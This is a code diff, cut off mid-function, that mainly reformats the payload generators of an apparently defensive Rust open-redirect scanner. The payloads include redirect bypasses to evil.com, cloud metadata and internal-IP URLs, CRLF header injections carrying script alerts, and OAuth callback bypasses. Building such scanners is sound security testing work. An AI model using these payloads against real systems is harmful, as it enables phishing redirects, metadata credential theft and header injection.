@@ -7,8 +7,8 @@ use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
 use futures::stream::{self, StreamExt};
 use regex::Regex;
 use std::collections::HashSet;
-use std::sync::Arc;
 use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
+use std::sync::Arc;
 use tokio::sync::Mutex;
 use tracing::{debug, info, warn};
 
@@ -95,10 +95,7 @@ impl OpenRedirectScanner {
         let mut domains = Vec::new();
 
         // Base evil domains - reduced set for speed
-        let base_domains = vec![
-            "evil.com",
-            "attacker.com",
-        ];
+        let base_domains = vec!["evil.com", "attacker.com"];
 
         // Add base domains
         for domain in &base_domains {
@@ -127,133 +124,398 @@ impl OpenRedirectScanner {
             // Standard protocols (essential)
             ("https://".to_string(), BypassCategory::Basic, "HTTPS"),
             ("http://".to_string(), BypassCategory::Basic, "HTTP"),
-            ("//".to_string(), BypassCategory::ProtocolRelative, "Protocol-relative"),
-
+            (
+                "//".to_string(),
+                BypassCategory::ProtocolRelative,
+                "Protocol-relative",
+            ),
             // Multiple slashes (key bypasses)
-            ("///".to_string(), BypassCategory::SlashManipulation, "Triple slash"),
-
+            (
+                "///".to_string(),
+                BypassCategory::SlashManipulation,
+                "Triple slash",
+            ),
             // Backslash variations (key bypasses)
-            ("/\\".to_string(), BypassCategory::BackslashTrick, "Slash-backslash"),
-            ("\\\\".to_string(), BypassCategory::BackslashTrick, "Double backslash (UNC)"),
-
+            (
+                "/\\".to_string(),
+                BypassCategory::BackslashTrick,
+                "Slash-backslash",
+            ),
+            (
+                "\\\\".to_string(),
+                BypassCategory::BackslashTrick,
+                "Double backslash (UNC)",
+            ),
             // Protocol variations (key bypasses)
-            ("https:/".to_string(), BypassCategory::ParserDifferential, "Single slash HTTPS"),
-            ("https:\\\\".to_string(), BypassCategory::ParserDifferential, "Backslash HTTPS"),
-
+            (
+                "https:/".to_string(),
+                BypassCategory::ParserDifferential,
+                "Single slash HTTPS",
+            ),
+            (
+                "https:\\\\".to_string(),
+                BypassCategory::ParserDifferential,
+                "Backslash HTTPS",
+            ),
             // Case mutations (one example)
-            ("HTTPS://".to_string(), BypassCategory::CaseMutation, "Uppercase HTTPS"),
-
+            (
+                "HTTPS://".to_string(),
+                BypassCategory::CaseMutation,
+                "Uppercase HTTPS",
+            ),
             // Dangerous protocols
-            ("javascript:".to_string(), BypassCategory::DangerousProtocol, "JavaScript protocol"),
-            ("data:text/html,".to_string(), BypassCategory::DataUri, "Data URI HTML"),
-
+            (
+                "javascript:".to_string(),
+                BypassCategory::DangerousProtocol,
+                "JavaScript protocol",
+            ),
+            (
+                "data:text/html,".to_string(),
+                BypassCategory::DataUri,
+                "Data URI HTML",
+            ),
             // Protocol confusion (key examples)
-            ("https:".to_string(), BypassCategory::ProtocolConfusion, "HTTPS no slashes"),
-            ("https:%0a//".to_string(), BypassCategory::ProtocolConfusion, "Newline in protocol"),
+            (
+                "https:".to_string(),
+                BypassCategory::ProtocolConfusion,
+                "HTTPS no slashes",
+            ),
+            (
+                "https:%0a//".to_string(),
+                BypassCategory::ProtocolConfusion,
+                "Newline in protocol",
+            ),
         ]
     }
 
     /// Generate URL encoding variations for a domain
-    fn generate_encoding_variations(&self, domain: &str) -> Vec<(String, BypassCategory, &'static str)> {
+    fn generate_encoding_variations(
+        &self,
+        domain: &str,
+    ) -> Vec<(String, BypassCategory, &'static str)> {
         let mut variations = Vec::new();
 
         // URL encode the domain
         let url_encoded = urlencoding::encode(domain);
-        variations.push((format!("https://{}", url_encoded), BypassCategory::EncodingBypass, "URL encoded domain"));
+        variations.push((
+            format!("https://{}", url_encoded),
+            BypassCategory::EncodingBypass,
+            "URL encoded domain",
+        ));
 
         // Double URL encode
         let double_encoded = urlencoding::encode(&url_encoded);
-        variations.push((format!("https://{}", double_encoded), BypassCategory::DoubleEncoding, "Double URL encoded"));
+        variations.push((
+            format!("https://{}", double_encoded),
+            BypassCategory::DoubleEncoding,
+            "Double URL encoded",
+        ));
 
         // Triple URL encode
         let triple_encoded = urlencoding::encode(&double_encoded);
-        variations.push((format!("https://{}", triple_encoded), BypassCategory::DoubleEncoding, "Triple URL encoded"));
+        variations.push((
+            format!("https://{}", triple_encoded),
+            BypassCategory::DoubleEncoding,
+            "Triple URL encoded",
+        ));
 
         // Encode the protocol too
-        variations.push((format!("https%3A%2F%2F{}", domain), BypassCategory::EncodingBypass, "Encoded protocol"));
-        variations.push((format!("https%253A%252F%252F{}", domain), BypassCategory::DoubleEncoding, "Double encoded protocol"));
-        variations.push((format!("https%25253A%25252F%25252F{}", domain), BypassCategory::DoubleEncoding, "Triple encoded protocol"));
+        variations.push((
+            format!("https%3A%2F%2F{}", domain),
+            BypassCategory::EncodingBypass,
+            "Encoded protocol",
+        ));
+        variations.push((
+            format!("https%253A%252F%252F{}", domain),
+            BypassCategory::DoubleEncoding,
+            "Double encoded protocol",
+        ));
+        variations.push((
+            format!("https%25253A%25252F%25252F{}", domain),
+            BypassCategory::DoubleEncoding,
+            "Triple encoded protocol",
+        ));
 
         // Partial encoding
-        variations.push((format!("ht%74ps://{}", domain), BypassCategory::EncodingBypass, "Partial protocol encode"));
-        variations.push((format!("htt%70s://{}", domain), BypassCategory::EncodingBypass, "Partial protocol encode 2"));
-        variations.push((format!("https%3a//{}", domain), BypassCategory::EncodingBypass, "Encoded colon"));
-        variations.push((format!("https:%2f%2f{}", domain), BypassCategory::EncodingBypass, "Encoded slashes"));
-        variations.push((format!("%2f%2f{}", domain), BypassCategory::EncodingBypass, "Encoded double slash"));
-        variations.push((format!("/%2f{}", domain), BypassCategory::EncodingBypass, "Slash + encoded slash"));
+        variations.push((
+            format!("ht%74ps://{}", domain),
+            BypassCategory::EncodingBypass,
+            "Partial protocol encode",
+        ));
+        variations.push((
+            format!("htt%70s://{}", domain),
+            BypassCategory::EncodingBypass,
+            "Partial protocol encode 2",
+        ));
+        variations.push((
+            format!("https%3a//{}", domain),
+            BypassCategory::EncodingBypass,
+            "Encoded colon",
+        ));
+        variations.push((
+            format!("https:%2f%2f{}", domain),
+            BypassCategory::EncodingBypass,
+            "Encoded slashes",
+        ));
+        variations.push((
+            format!("%2f%2f{}", domain),
+            BypassCategory::EncodingBypass,
+            "Encoded double slash",
+        ));
+        variations.push((
+            format!("/%2f{}", domain),
+            BypassCategory::EncodingBypass,
+            "Slash + encoded slash",
+        ));
 
         // Hex encoding variations
-        let hex_domain: String = domain.chars()
+        let hex_domain: String = domain
+            .chars()
             .map(|c| format!("%{:02x}", c as u8))
             .collect();
-        variations.push((format!("https://{}", hex_domain), BypassCategory::EncodingBypass, "Full hex encoded domain"));
+        variations.push((
+            format!("https://{}", hex_domain),
+            BypassCategory::EncodingBypass,
+            "Full hex encoded domain",
+        ));
 
         // Mixed encoding
-        variations.push((format!("https://%65%76%69%6c.com"), BypassCategory::EncodingBypass, "Hex encoded evil"));
-        variations.push((format!("//%65%76%69%6c%2e%63%6f%6d"), BypassCategory::EncodingBypass, "Hex protocol-relative"));
+        variations.push((
+            format!("https://%65%76%69%6c.com"),
+            BypassCategory::EncodingBypass,
+            "Hex encoded evil",
+        ));
+        variations.push((
+            format!("//%65%76%69%6c%2e%63%6f%6d"),
+            BypassCategory::EncodingBypass,
+            "Hex protocol-relative",
+        ));
 
         // Unicode encoding
-        variations.push((format!("https://{}%E3%80%82com", domain.replace(".com", "")), BypassCategory::UnicodeBypass, "Unicode fullwidth dot"));
-        variations.push((format!("https://{}%ef%bc%8ecom", domain.replace(".com", "")), BypassCategory::UnicodeBypass, "Unicode dot encoded"));
-        variations.push((format!("https://{}%e2%80%8b.com", domain.replace(".com", "")), BypassCategory::UnicodeBypass, "Zero-width space encoded"));
+        variations.push((
+            format!("https://{}%E3%80%82com", domain.replace(".com", "")),
+            BypassCategory::UnicodeBypass,
+            "Unicode fullwidth dot",
+        ));
+        variations.push((
+            format!("https://{}%ef%bc%8ecom", domain.replace(".com", "")),
+            BypassCategory::UnicodeBypass,
+            "Unicode dot encoded",
+        ));
+        variations.push((
+            format!("https://{}%e2%80%8b.com", domain.replace(".com", "")),
+            BypassCategory::UnicodeBypass,
+            "Zero-width space encoded",
+        ));
 
         // Overlong UTF-8 encoding (may bypass some filters)
-        variations.push((format!("https://%c0%ae%c0%ae/{}", domain), BypassCategory::EncodingBypass, "Overlong UTF-8 dots"));
+        variations.push((
+            format!("https://%c0%ae%c0%ae/{}", domain),
+            BypassCategory::EncodingBypass,
+            "Overlong UTF-8 dots",
+        ));
 
         variations
     }
 
     /// Generate whitelist bypass variations
-    fn generate_whitelist_bypasses(&self, target_domain: &str, evil_domain: &str) -> Vec<(String, BypassCategory, &'static str)> {
+    fn generate_whitelist_bypasses(
+        &self,
+        target_domain: &str,
+        evil_domain: &str,
+    ) -> Vec<(String, BypassCategory, &'static str)> {
         let mut bypasses = Vec::new();
 
         // Userinfo (credentials) bypasses
-        bypasses.push((format!("https://{}@{}", target_domain, evil_domain), BypassCategory::UserInfoAbuse, "Userinfo @ bypass"));
-        bypasses.push((format!("https://{}%40{}", target_domain, evil_domain), BypassCategory::UserInfoAbuse, "Encoded @ bypass"));
-        bypasses.push((format!("https://{}:password@{}", target_domain, evil_domain), BypassCategory::UserInfoAbuse, "User:pass @ bypass"));
-        bypasses.push((format!("https://:@{}:{}", evil_domain, target_domain), BypassCategory::UserInfoAbuse, "Empty user with port"));
-        bypasses.push((format!("https://{}:@{}", target_domain, evil_domain), BypassCategory::UserInfoAbuse, "Empty password"));
-        bypasses.push((format!("//{}@{}", target_domain, evil_domain), BypassCategory::UserInfoAbuse, "Protocol-relative userinfo"));
-        bypasses.push((format!("//{}%40{}", target_domain, evil_domain), BypassCategory::UserInfoAbuse, "Protocol-relative encoded @"));
-        bypasses.push((format!("https://{}\\@{}", target_domain, evil_domain), BypassCategory::BackslashTrick, "Backslash userinfo"));
-        bypasses.push((format!("//{}\\@{}", target_domain, evil_domain), BypassCategory::BackslashTrick, "Protocol-rel backslash @"));
+        bypasses.push((
+            format!("https://{}@{}", target_domain, evil_domain),
+            BypassCategory::UserInfoAbuse,
+            "Userinfo @ bypass",
+        ));
+        bypasses.push((
+            format!("https://{}%40{}", target_domain, evil_domain),
+            BypassCategory::UserInfoAbuse,
+            "Encoded @ bypass",
+        ));
+        bypasses.push((
+            format!("https://{}:password@{}", target_domain, evil_domain),
+            BypassCategory::UserInfoAbuse,
+            "User:pass @ bypass",
+        ));
+        bypasses.push((
+            format!("https://:@{}:{}", evil_domain, target_domain),
+            BypassCategory::UserInfoAbuse,
+            "Empty user with port",
+        ));
+        bypasses.push((
+            format!("https://{}:@{}", target_domain, evil_domain),
+            BypassCategory::UserInfoAbuse,
+            "Empty password",
+        ));
+        bypasses.push((
+            format!("//{}@{}", target_domain, evil_domain),
+            BypassCategory::UserInfoAbuse,
+            "Protocol-relative userinfo",
+        ));
+        bypasses.push((
+            format!("//{}%40{}", target_domain, evil_domain),
+            BypassCategory::UserInfoAbuse,
+            "Protocol-relative encoded @",
+        ));
+        bypasses.push((
+            format!("https://{}\\@{}", target_domain, evil_domain),
+            BypassCategory::BackslashTrick,
+            "Backslash userinfo",
+        ));
+        bypasses.push((
+            format!("//{}\\@{}", target_domain, evil_domain),
+            BypassCategory::BackslashTrick,
+            "Protocol-rel backslash @",
+        ));
 
         // Subdomain bypasses
-        bypasses.push((format!("https://{}.{}", target_domain, evil_domain), BypassCategory::DomainConfusion, "Target as subdomain"));
-        bypasses.push((format!("https://{}-{}", target_domain, evil_domain), BypassCategory::DomainConfusion, "Hyphen domain bypass"));
-        bypasses.push((format!("https://{}_{}", target_domain, evil_domain), BypassCategory::DomainConfusion, "Underscore domain"));
-        bypasses.push((format!("https://{}{}", target_domain, evil_domain), BypassCategory::DomainConfusion, "Concatenated domain"));
-        bypasses.push((format!("//{}.{}", target_domain, evil_domain), BypassCategory::DomainConfusion, "Protocol-rel subdomain"));
+        bypasses.push((
+            format!("https://{}.{}", target_domain, evil_domain),
+            BypassCategory::DomainConfusion,
+            "Target as subdomain",
+        ));
+        bypasses.push((
+            format!("https://{}-{}", target_domain, evil_domain),
+            BypassCategory::DomainConfusion,
+            "Hyphen domain bypass",
+        ));
+        bypasses.push((
+            format!("https://{}_{}", target_domain, evil_domain),
+            BypassCategory::DomainConfusion,
+            "Underscore domain",
+        ));
+        bypasses.push((
+            format!("https://{}{}", target_domain, evil_domain),
+            BypassCategory::DomainConfusion,
+            "Concatenated domain",
+        ));
+        bypasses.push((
+            format!("//{}.{}", target_domain, evil_domain),
+            BypassCategory::DomainConfusion,
+            "Protocol-rel subdomain",
+        ));
 
         // Path-based bypasses
-        bypasses.push((format!("https://{}/{}", evil_domain, target_domain), BypassCategory::PathConfusion, "Target in path"));
-        bypasses.push((format!("https://{}\\{}", evil_domain, target_domain), BypassCategory::BackslashTrick, "Backslash path"));
-        bypasses.push((format!("https://{}%5C{}", evil_domain, target_domain), BypassCategory::BackslashTrick, "Encoded backslash path"));
-        bypasses.push((format!("https://{}%2F{}", evil_domain, target_domain), BypassCategory::EncodingBypass, "Encoded slash path"));
+        bypasses.push((
+            format!("https://{}/{}", evil_domain, target_domain),
+            BypassCategory::PathConfusion,
+            "Target in path",
+        ));
+        bypasses.push((
+            format!("https://{}\\{}", evil_domain, target_domain),
+            BypassCategory::BackslashTrick,
+            "Backslash path",
+        ));
+        bypasses.push((
+            format!("https://{}%5C{}", evil_domain, target_domain),
+            BypassCategory::BackslashTrick,
+            "Encoded backslash path",
+        ));
+        bypasses.push((
+            format!("https://{}%2F{}", evil_domain, target_domain),
+            BypassCategory::EncodingBypass,
+            "Encoded slash path",
+        ));
 
         // Query string bypasses
-        bypasses.push((format!("https://{}?{}", evil_domain, target_domain), BypassCategory::WhitelistBypass, "Target in query"));
-        bypasses.push((format!("https://{}%3F{}", evil_domain, target_domain), BypassCategory::EncodingBypass, "Encoded query"));
-        bypasses.push((format!("https://{}?url={}", evil_domain, target_domain), BypassCategory::WhitelistBypass, "Target as param value"));
+        bypasses.push((
+            format!("https://{}?{}", evil_domain, target_domain),
+            BypassCategory::WhitelistBypass,
+            "Target in query",
+        ));
+        bypasses.push((
+            format!("https://{}%3F{}", evil_domain, target_domain),
+            BypassCategory::EncodingBypass,
+            "Encoded query",
+        ));
+        bypasses.push((
+            format!("https://{}?url={}", evil_domain, target_domain),
+            BypassCategory::WhitelistBypass,
+            "Target as param value",
+        ));
 
         // Fragment bypasses
-        bypasses.push((format!("https://{}#{}", evil_domain, target_domain), BypassCategory::FragmentAbuse, "Target in fragment"));
-        bypasses.push((format!("https://{}%23{}", evil_domain, target_domain), BypassCategory::EncodingBypass, "Encoded fragment"));
-        bypasses.push((format!("https://{}#@{}", evil_domain, target_domain), BypassCategory::FragmentAbuse, "Fragment with @"));
+        bypasses.push((
+            format!("https://{}#{}", evil_domain, target_domain),
+            BypassCategory::FragmentAbuse,
+            "Target in fragment",
+        ));
+        bypasses.push((
+            format!("https://{}%23{}", evil_domain, target_domain),
+            BypassCategory::EncodingBypass,
+            "Encoded fragment",
+        ));
+        bypasses.push((
+            format!("https://{}#@{}", evil_domain, target_domain),
+            BypassCategory::FragmentAbuse,
+            "Fragment with @",
+        ));
 
         // Path traversal
-        bypasses.push((format!("https://{}/..%2f..%2f{}", target_domain, evil_domain), BypassCategory::PathConfusion, "Path traversal"));
-        bypasses.push((format!("https://{}%252f%252e%252e%252f{}", target_domain, evil_domain), BypassCategory::DoubleEncoding, "Double encoded traversal"));
-        bypasses.push((format!("/{}/..%2f..%2f..%2f{}", target_domain, evil_domain), BypassCategory::PathConfusion, "Relative path traversal"));
+        bypasses.push((
+            format!("https://{}/..%2f..%2f{}", target_domain, evil_domain),
+            BypassCategory::PathConfusion,
+            "Path traversal",
+        ));
+        bypasses.push((
+            format!(
+                "https://{}%252f%252e%252e%252f{}",
+                target_domain, evil_domain
+            ),
+            BypassCategory::DoubleEncoding,
+            "Double encoded traversal",
+        ));
+        bypasses.push((
+            format!("/{}/..%2f..%2f..%2f{}", target_domain, evil_domain),
+            BypassCategory::PathConfusion,
+            "Relative path traversal",
+        ));
 
         // Null byte injection
-        bypasses.push((format!("https://{}.com%00.{}", evil_domain.replace(".com", ""), target_domain), BypassCategory::NullByteInjection, "Null byte domain"));
-        bypasses.push((format!("https://{}%00{}", target_domain, evil_domain), BypassCategory::NullByteInjection, "Null byte separator"));
-        bypasses.push((format!("https://{}\x00.{}", evil_domain.replace(".com", ""), target_domain), BypassCategory::NullByteInjection, "Raw null byte"));
+        bypasses.push((
+            format!(
+                "https://{}.com%00.{}",
+                evil_domain.replace(".com", ""),
+                target_domain
+            ),
+            BypassCategory::NullByteInjection,
+            "Null byte domain",
+        ));
+        bypasses.push((
+            format!("https://{}%00{}", target_domain, evil_domain),
+            BypassCategory::NullByteInjection,
+            "Null byte separator",
+        ));
+        bypasses.push((
+            format!(
+                "https://{}\x00.{}",
+                evil_domain.replace(".com", ""),
+                target_domain
+            ),
+            BypassCategory::NullByteInjection,
+            "Raw null byte",
+        ));
 
         // Regex bypass attempts
-        bypasses.push((format!("https://{}\\.{}", target_domain, evil_domain), BypassCategory::WhitelistBypass, "Escaped dot regex"));
-        bypasses.push((format!("https://{}[.]{}", target_domain.replace(".", ""), evil_domain), BypassCategory::WhitelistBypass, "Bracket dot regex"));
+        bypasses.push((
+            format!("https://{}\\.{}", target_domain, evil_domain),
+            BypassCategory::WhitelistBypass,
+            "Escaped dot regex",
+        ));
+        bypasses.push((
+            format!(
+                "https://{}[.]{}",
+                target_domain.replace(".", ""),
+                evil_domain
+            ),
+            BypassCategory::WhitelistBypass,
+            "Bracket dot regex",
+        ));
 
         bypasses
     }
@@ -263,88 +525,266 @@ impl OpenRedirectScanner {
         let mut ips = Vec::new();
 
         // Localhost variations
-        ips.push(("http://127.0.0.1".to_string(), BypassCategory::IPAddress, "IPv4 localhost"));
-        ips.push(("http://127.0.1".to_string(), BypassCategory::IPAddress, "Short localhost"));
-        ips.push(("http://127.1".to_string(), BypassCategory::IPAddress, "Shorter localhost"));
+        ips.push((
+            "http://127.0.0.1".to_string(),
+            BypassCategory::IPAddress,
+            "IPv4 localhost",
+        ));
+        ips.push((
+            "http://127.0.1".to_string(),
+            BypassCategory::IPAddress,
+            "Short localhost",
+        ));
+        ips.push((
+            "http://127.1".to_string(),
+            BypassCategory::IPAddress,
+            "Shorter localhost",
+        ));
         ips.push(("http://0".to_string(), BypassCategory::IPAddress, "Zero IP"));
-        ips.push(("http://0.0.0.0".to_string(), BypassCategory::IPAddress, "All zeros"));
-        ips.push(("http://[::1]".to_string(), BypassCategory::IPAddress, "IPv6 localhost"));
-        ips.push(("http://[0:0:0:0:0:0:0:1]".to_string(), BypassCategory::IPAddress, "Full IPv6 localhost"));
-        ips.push(("http://[::ffff:127.0.0.1]".to_string(), BypassCategory::IPAddress, "IPv6 mapped localhost"));
+        ips.push((
+            "http://0.0.0.0".to_string(),
+            BypassCategory::IPAddress,
+            "All zeros",
+        ));
+        ips.push((
+            "http://[::1]".to_string(),
+            BypassCategory::IPAddress,
+            "IPv6 localhost",
+        ));
+        ips.push((
+            "http://[0:0:0:0:0:0:0:1]".to_string(),
+            BypassCategory::IPAddress,
+            "Full IPv6 localhost",
+        ));
+        ips.push((
+            "http://[::ffff:127.0.0.1]".to_string(),
+            BypassCategory::IPAddress,
+            "IPv6 mapped localhost",
+        ));
 
         // Decimal/Hex/Octal localhost (127.0.0.1)
-        ips.push(("http://2130706433".to_string(), BypassCategory::IPAddress, "Decimal localhost"));
-        ips.push(("http://0x7f000001".to_string(), BypassCategory::IPAddress, "Hex localhost"));
-        ips.push(("http://0x7f.0x0.0x0.0x1".to_string(), BypassCategory::IPAddress, "Dotted hex localhost"));
-        ips.push(("http://017700000001".to_string(), BypassCategory::IPAddress, "Octal localhost"));
-        ips.push(("http://0177.0.0.01".to_string(), BypassCategory::IPAddress, "Dotted octal localhost"));
-        ips.push(("http://0177.0000.0000.0001".to_string(), BypassCategory::IPAddress, "Padded octal localhost"));
+        ips.push((
+            "http://2130706433".to_string(),
+            BypassCategory::IPAddress,
+            "Decimal localhost",
+        ));
+        ips.push((
+            "http://0x7f000001".to_string(),
+            BypassCategory::IPAddress,
+            "Hex localhost",
+        ));
+        ips.push((
+            "http://0x7f.0x0.0x0.0x1".to_string(),
+            BypassCategory::IPAddress,
+            "Dotted hex localhost",
+        ));
+        ips.push((
+            "http://017700000001".to_string(),
+            BypassCategory::IPAddress,
+            "Octal localhost",
+        ));
+        ips.push((
+            "http://0177.0.0.01".to_string(),
+            BypassCategory::IPAddress,
+            "Dotted octal localhost",
+        ));
+        ips.push((
+            "http://0177.0000.0000.0001".to_string(),
+            BypassCategory::IPAddress,
+            "Padded octal localhost",
+        ));
 
         // Mixed notation
-        ips.push(("http://0x7f.0.0.1".to_string(), BypassCategory::IPAddress, "Mixed hex-dec"));
-        ips.push(("http://0177.0.0.0x1".to_string(), BypassCategory::IPAddress, "Mixed oct-hex"));
-        ips.push(("http://127.0x0.0.1".to_string(), BypassCategory::IPAddress, "Mixed dec-hex"));
+        ips.push((
+            "http://0x7f.0.0.1".to_string(),
+            BypassCategory::IPAddress,
+            "Mixed hex-dec",
+        ));
+        ips.push((
+            "http://0177.0.0.0x1".to_string(),
+            BypassCategory::IPAddress,
+            "Mixed oct-hex",
+        ));
+        ips.push((
+            "http://127.0x0.0.1".to_string(),
+            BypassCategory::IPAddress,
+            "Mixed dec-hex",
+        ));
 
         // AWS metadata endpoint (169.254.169.254)
-        ips.push(("http://169.254.169.254".to_string(), BypassCategory::IPAddress, "AWS metadata"));
-        ips.push(("http://2852039166".to_string(), BypassCategory::IPAddress, "Decimal AWS metadata"));
-        ips.push(("http://0xa9fea9fe".to_string(), BypassCategory::IPAddress, "Hex AWS metadata"));
-        ips.push(("http://[::ffff:169.254.169.254]".to_string(), BypassCategory::IPAddress, "IPv6 AWS metadata"));
-        ips.push(("http://0251.0376.0251.0376".to_string(), BypassCategory::IPAddress, "Octal AWS metadata"));
-        ips.push(("http://0xa9.0xfe.0xa9.0xfe".to_string(), BypassCategory::IPAddress, "Dotted hex AWS"));
+        ips.push((
+            "http://169.254.169.254".to_string(),
+            BypassCategory::IPAddress,
+            "AWS metadata",
+        ));
+        ips.push((
+            "http://2852039166".to_string(),
+            BypassCategory::IPAddress,
+            "Decimal AWS metadata",
+        ));
+        ips.push((
+            "http://0xa9fea9fe".to_string(),
+            BypassCategory::IPAddress,
+            "Hex AWS metadata",
+        ));
+        ips.push((
+            "http://[::ffff:169.254.169.254]".to_string(),
+            BypassCategory::IPAddress,
+            "IPv6 AWS metadata",
+        ));
+        ips.push((
+            "http://0251.0376.0251.0376".to_string(),
+            BypassCategory::IPAddress,
+            "Octal AWS metadata",
+        ));
+        ips.push((
+            "http://0xa9.0xfe.0xa9.0xfe".to_string(),
+            BypassCategory::IPAddress,
+            "Dotted hex AWS",
+        ));
 
         // Google Cloud metadata (metadata.google.internal)
-        ips.push(("http://metadata.google.internal".to_string(), BypassCategory::IPAddress, "GCP metadata"));
-        ips.push(("http://169.254.169.254/computeMetadata/v1/".to_string(), BypassCategory::IPAddress, "GCP metadata path"));
+        ips.push((
+            "http://metadata.google.internal".to_string(),
+            BypassCategory::IPAddress,
+            "GCP metadata",
+        ));
+        ips.push((
+            "http://169.254.169.254/computeMetadata/v1/".to_string(),
+            BypassCategory::IPAddress,
+            "GCP metadata path",
+        ));
 
         // Azure metadata
-        ips.push(("http://169.254.169.254/metadata/instance".to_string(), BypassCategory::IPAddress, "Azure metadata"));
+        ips.push((
+            "http://169.254.169.254/metadata/instance".to_string(),
+            BypassCategory::IPAddress,
+            "Azure metadata",
+        ));
 
         // Digital Ocean
-        ips.push(("http://169.254.169.254/metadata/v1/".to_string(), BypassCategory::IPAddress, "DO metadata"));
+        ips.push((
+            "http://169.254.169.254/metadata/v1/".to_string(),
+            BypassCategory::IPAddress,
+            "DO metadata",
+        ));
 
         // Internal ranges
-        ips.push(("http://10.0.0.1".to_string(), BypassCategory::IPAddress, "Internal 10.x"));
-        ips.push(("http://172.16.0.1".to_string(), BypassCategory::IPAddress, "Internal 172.16.x"));
-        ips.push(("http://192.168.0.1".to_string(), BypassCategory::IPAddress, "Internal 192.168.x"));
+        ips.push((
+            "http://10.0.0.1".to_string(),
+            BypassCategory::IPAddress,
+            "Internal 10.x",
+        ));
+        ips.push((
+            "http://172.16.0.1".to_string(),
+            BypassCategory::IPAddress,
+            "Internal 172.16.x",
+        ));
+        ips.push((
+            "http://192.168.0.1".to_string(),
+            BypassCategory::IPAddress,
+            "Internal 192.168.x",
+        ));
 
         ips
     }
 
     /// Generate CRLF/Header injection variations
-    fn generate_crlf_injections(&self, evil_domain: &str) -> Vec<(String, BypassCategory, &'static str)> {
+    fn generate_crlf_injections(
+        &self,
+        evil_domain: &str,
+    ) -> Vec<(String, BypassCategory, &'static str)> {
         let mut injections = Vec::new();
 
         // Standard CRLF
-        injections.push((format!("%0d%0aLocation:%20https://{}", evil_domain), BypassCategory::HeaderInjection, "CRLF injection"));
-        injections.push((format!("%0aLocation:%20https://{}", evil_domain), BypassCategory::HeaderInjection, "LF only"));
-        injections.push((format!("%0dLocation:%20https://{}", evil_domain), BypassCategory::HeaderInjection, "CR only"));
+        injections.push((
+            format!("%0d%0aLocation:%20https://{}", evil_domain),
+            BypassCategory::HeaderInjection,
+            "CRLF injection",
+        ));
+        injections.push((
+            format!("%0aLocation:%20https://{}", evil_domain),
+            BypassCategory::HeaderInjection,
+            "LF only",
+        ));
+        injections.push((
+            format!("%0dLocation:%20https://{}", evil_domain),
+            BypassCategory::HeaderInjection,
+            "CR only",
+        ));
 
         // Double encoded
-        injections.push((format!("%250d%250aLocation:%20https://{}", evil_domain), BypassCategory::HeaderInjection, "Double encoded CRLF"));
-        injections.push((format!("%25%30%64%25%30%61Location:%20https://{}", evil_domain), BypassCategory::HeaderInjection, "Triple encoded CRLF"));
+        injections.push((
+            format!("%250d%250aLocation:%20https://{}", evil_domain),
+            BypassCategory::HeaderInjection,
+            "Double encoded CRLF",
+        ));
+        injections.push((
+            format!("%25%30%64%25%30%61Location:%20https://{}", evil_domain),
+            BypassCategory::HeaderInjection,
+            "Triple encoded CRLF",
+        ));
 
         // Unicode CRLF
-        injections.push((format!("%e5%98%8a%e5%98%8dLocation:%20https://{}", evil_domain), BypassCategory::HeaderInjection, "Unicode CRLF"));
-        injections.push((format!("%u000aLocation:%20https://{}", evil_domain), BypassCategory::HeaderInjection, "Unicode LF"));
-        injections.push((format!("%u000dLocation:%20https://{}", evil_domain), BypassCategory::HeaderInjection, "Unicode CR"));
+        injections.push((
+            format!("%e5%98%8a%e5%98%8dLocation:%20https://{}", evil_domain),
+            BypassCategory::HeaderInjection,
+            "Unicode CRLF",
+        ));
+        injections.push((
+            format!("%u000aLocation:%20https://{}", evil_domain),
+            BypassCategory::HeaderInjection,
+            "Unicode LF",
+        ));
+        injections.push((
+            format!("%u000dLocation:%20https://{}", evil_domain),
+            BypassCategory::HeaderInjection,
+            "Unicode CR",
+        ));
 
         // With body injection (XSS)
-        injections.push((format!("%0d%0a%0d%0a<script>alert(document.domain)</script>"), BypassCategory::HeaderInjection, "CRLF with XSS"));
-        injections.push((format!("%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"), BypassCategory::HeaderInjection, "CRLF with content-type"));
+        injections.push((
+            format!("%0d%0a%0d%0a<script>alert(document.domain)</script>"),
+            BypassCategory::HeaderInjection,
+            "CRLF with XSS",
+        ));
+        injections.push((
+            format!("%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"),
+            BypassCategory::HeaderInjection,
+            "CRLF with content-type",
+        ));
 
         // Tab/space variations
-        injections.push((format!("%0d%0a%09Location:%20https://{}", evil_domain), BypassCategory::HeaderInjection, "CRLF with tab"));
-        injections.push((format!("%0d%0a%20Location:%20https://{}", evil_domain), BypassCategory::HeaderInjection, "CRLF with space"));
+        injections.push((
+            format!("%0d%0a%09Location:%20https://{}", evil_domain),
+            BypassCategory::HeaderInjection,
+            "CRLF with tab",
+        ));
+        injections.push((
+            format!("%0d%0a%20Location:%20https://{}", evil_domain),
+            BypassCategory::HeaderInjection,
+            "CRLF with space",
+        ));
 
         // Multiple headers
-        injections.push((format!("%0d%0aSet-Cookie:%20evil=value%0d%0aLocation:%20https://{}", evil_domain), BypassCategory::HeaderInjection, "CRLF cookie + location"));
+        injections.push((
+            format!(
+                "%0d%0aSet-Cookie:%20evil=value%0d%0aLocation:%20https://{}",
+                evil_domain
+            ),
+            BypassCategory::HeaderInjection,
+            "CRLF cookie + location",
+        ));
 
         injections
     }
 
     /// Generate OAuth/OIDC specific bypass payloads
-    fn generate_oauth_bypasses(&self, target_domain: &str, evil_domain: &str) -> Vec<(String, BypassCategory, &'static str)> {
+    fn generate_oauth_bypasses(
+        &self,
+        target_domain: &str,
+        evil_domain: &str,
+    ) -> Vec<(String, BypassCategory, &'static str)> {
         let mut bypasses = Vec::new();
 
         // Standard OAuth callback paths on evil domain
@@ -361,21 +801,66 @@ impl OpenRedirectScanner {
         ];
 
         for path in &oauth_paths {
-            bypasses.push((format!("https://{}{}", evil_domain, path), BypassCategory::OAuthBypass, "OAuth callback path"));
+            bypasses.push((
+                format!("https://{}{}", evil_domain, path),
+                BypassCategory::OAuthBypass,
+                "OAuth callback path",
+            ));
         }
 
         // Path traversal in OAuth
-        bypasses.push((format!("https://{}/..%2f..%2f{}", target_domain, evil_domain), BypassCategory::OAuthBypass, "OAuth path traversal"));
-        bypasses.push((format!("https://{}%252f%252e%252e%252f{}", target_domain, evil_domain), BypassCategory::OAuthBypass, "Double encoded OAuth traversal"));
